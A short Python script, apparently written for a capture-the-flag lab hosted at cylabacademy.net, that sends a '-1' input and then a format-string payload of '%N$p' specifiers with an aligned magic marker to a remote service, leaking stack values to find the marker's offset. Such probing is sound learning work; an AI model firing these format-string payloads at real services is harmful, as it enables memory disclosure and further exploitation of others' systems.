import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
MAGIC = 0x4847464544434241


def talk(a, b, wait=1.0):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(6)
    time.sleep(0.3)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(a + b"\n"); time.sleep(0.15)
    s.sendall(b + b"\n"); time.sleep(wait)
    out = b""
    try:
        while True:
            c = s.recv(1 << 16)
            if not c:
                break
            out += c
    except Exception:
        pass
    s.close()
    return out


# B = "1" + champs %p + MAGIC aligne
fmt = b"1" + b"." + b".".join([b"%" + str(i).encode() + b"$p" for i in range(50, 62)])
pad = b"P" * ((8 - (len(fmt) % 8)) % 8)
off = len(fmt) + len(pad)
b = fmt + pad + struct.pack("<Q", MAGIC)
out = talk(b"-1", b)
txt = out.decode("utf-8", "replace")
print("len(B):", len(b), "off MAGIC:", off, "pos attendu:", 42 + off // 8)
print(txt[:1000])
print("\nMAGIC hex present:", "0x4847464544434241" in txt)
print("ABCDEFGH present:", "ABCDEFGH" in txt)
